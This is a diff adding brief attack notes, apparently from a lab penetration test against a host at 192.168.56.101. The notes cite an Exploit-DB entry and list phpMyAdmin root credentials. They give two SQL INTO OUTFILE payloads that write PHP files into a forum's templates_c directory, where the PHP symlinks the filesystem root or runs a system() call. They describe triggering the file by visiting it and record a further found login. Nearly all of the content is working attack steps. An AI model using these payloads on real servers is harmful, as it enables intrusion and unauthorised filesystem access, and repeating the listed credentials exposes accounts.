@@ -1,0 +1,22 @@
+https://www.exploit-db.com/exploits/27397
+
+https://192.168.56.101/phpmyadmin/
+	|---> root:Fg-'kKXBj87E:aJ$
+ 
+SELECT 1, '<?php symlink(\"/\", \"files.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/exec.php'
+
+
+activate by visiting the stored exec.php file
+
+
+https://192.168.56.101/forum/templates_c/files.php
+	|--> direct access to the filesystem
+
+home - lookatme - password
+
+
+
+
+OPTION 2
+SELECT "<?php system('ln -sf / tree'); symlink('/', 'tree');?>" INTO OUTFILE '/var/www/forum/templates_c/exec_2.php'
+
